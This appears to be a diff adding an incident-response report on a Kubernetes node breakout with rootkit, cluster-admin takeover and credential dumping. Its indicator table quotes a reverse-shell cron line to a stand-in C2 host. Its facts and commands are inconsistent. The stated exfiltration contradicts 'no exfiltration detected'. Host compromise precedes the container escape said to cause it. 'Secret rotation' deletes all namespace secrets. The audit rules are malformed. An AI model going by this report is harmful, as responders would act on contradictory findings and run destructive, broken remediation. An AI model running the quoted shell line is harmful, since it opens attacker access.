@@ -1,0 +1,76 @@
+Executive Summary
+
+A single Kubernetes worker node (k8s-worker-node-01) was compromised through a container breakout that enabled host‑level access, kernel rootkit installation, cluster‑admin privilege escalation, credential dumping, and persistence via a reverse‑shell cron job. The attacker leveraged the compromised service account webapp-sa to gain unrestricted control of the Kubernetes control plane and to exfiltrate secrets. Immediate isolation, kernel integrity verification, RBAC rollback, secret rotation, and crontab cleanup are required to contain the threat and prevent lateral movement.
+
+1. Incident Overview
+PHASE	KEY EVENT	LOG SOURCE	TIMESTAMP (UTC)
+Reconnaissance	Cross‑namespace pod discovery by webapp-sa	k8s_api_audit.json	08:48:12
+Container Escape	Privileged pod system-health-diagnostics-pod created with host access; nsenter escape	k8s_api_audit.json, linux_dmesg_syslog.log	08:50:04
+Control‑Plane Takeover	ClusterRoleBinding granting cluster-admin to webapp-sa	k8s_api_audit.json	08:52:18
+Credential Dumping	/etc/shadow read by root shell; cluster secrets dumped	linux_audit.log, k8s_api_audit.json	08:42:15 / 08:53:40
+Kernel Compromise	LKM diamorphine.ko loaded via insmod	linux_dmesg_syslog.log, linux_audit.log	08:45:30
+Persistence	Reverse‑shell cron job under www-data	linux_auth.log	08:39:01
+Local Pivot	Interactive root shell via deploy	linux_auth.log	08:42:05
+2. Impact Assessment
+CATEGORY	FINDINGS
+Cluster Control	Attacker holds cluster-admin; can modify any resource, including secrets and RBAC objects.
+Host Kernel	Rootkit installed (diamorphine.ko) provides stealth persistence and potential lateral movement to other nodes.
+Credential Exposure	Password hashes from /etc/shadow and all cluster secrets were extracted.
+Persistence & C2	Reverse‑shell cron job ensures continued foothold even after reboots.
+Lateral Movement	No evidence of further spread beyond the compromised node; no external exfiltration detected in logs.
+3. Timeline (Compressed)
+UTC TIME	EVENT	INDICATOR
+08:39:01	Cron job under www-data spawns reverse shell to 198.51.100.77:4444	C2 outbound connection
+08:42:05	deploy obtains root shell via sudo	Local pivot
+08:42:15	/etc/shadow read (auditd syscall 257)	Credential dumping
+08:45:30	diamorphine.ko loaded (auditd syscall 313)	Kernel compromise
+08:48:12	Cross‑namespace discovery by webapp-sa	Reconnaissance
+08:50:04	Privileged pod created; nsenter escape	Container breakout
+08:52:18	ClusterRoleBinding to cluster-admin	Control‑plane takeover
+08:53:40	Secret dump across namespace default	Credential dumping
+4. Confirmed Threat Indicators (IoCs)
+INDICATOR TYPE	VALUE	SOURCE
+ServiceAccount	system:serviceaccount:frontend-apps:webapp-sa	k8s_api_audit.json
+Host IP	10.244.1.45	k8s_api_audit.json
+External C2 IP	198.51.100.77	linux_auth.log
+Kernel Module	diamorphine.ko	linux_dmesg_syslog.log, linux_audit.log
+Cron Job	/bin/bash -c "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"	linux_auth.log
+Privileged Pod	system-health-diagnostics-pod (hostPID=True, hostNetwork=True, hostIPC=True, hostPath='/')	k8s_api_audit.json
+ClusterRoleBinding	system-cluster-admin-binding	k8s_api_audit.json
+5. Immediate Containment Actions
+Quarantine Node
+# On the compromised node
+iptables -A INPUT -j DROP
+iptables -A OUTPUT -j DROP
+
+Kernel Integrity Verification & Module Removal
+lsmod | grep diamorphine
+rmmod diamorphine
+
+Revoke Elevated Privileges
+kubectl delete clusterrolebinding system-cluster-admin-binding
+
+Secret Rotation
+# Rotate all secrets in the default namespace
+kubectl get secret -n default -o name | xargs -I{} kubectl delete secret {}
+
+Cron & Persistence Cleanup
+crontab -u www-data -l | grep -v '198.51.100.77' | crontab -
+crontab -u deploy -l | grep -v '198.51.100.77' | crontab -
+
+Auditd Logging Enhancement
+echo "auditctl -a always,exit -F arch=b64 -S insmod,finit_module -k kernel_module_load" >> /etc/audit/rules.d/99-kernel.rules
+echo "auditctl -a always,exit -F arch=b64 -S openat -F path=/etc/shadow -k shadow_access" >> /etc/audit/rules.d/99-shadow.rules
+service auditd restart
+
+6. Long‑Term Remediation & Monitoring
+AREA	ACTION
+Kernel Hardening	Enable module signing; restrict insmod to signed modules only.
+Pod Security	Enforce PodSecurityPolicy or OPA Gatekeeper rules that deny host access unless explicitly approved.
+Audit Logging	Centralize auditd logs to a secure, tamper‑evident SIEM; enable real‑time alerts for syscall=313 and openat /etc/shadow.
+C2 Detection	Deploy Falco or Sysdig to flag outbound connections from cron jobs to unknown IPs.
+RBAC Review	Periodically audit ServiceAccounts for cluster‑admin privileges; enforce least privilege.
+Incident Response Playbook	Update playbooks to include kernel module removal, node quarantine, and secret rotation as first‑line actions.
+7. Conclusion
+
+The evidence conclusively demonstrates a multi‑stage compromise confined to k8s-worker-node-01. The attacker achieved full cluster control, installed a stealth kernel rootkit, harvested credentials, and established persistent reverse‑shell access. Immediate isolation, kernel module removal, RBAC rollback, secret rotation, and cron cleanup are mandatory to contain the threat. Enhanced monitoring and hardening will prevent recurrence and enable rapid detection of similar future attacks.
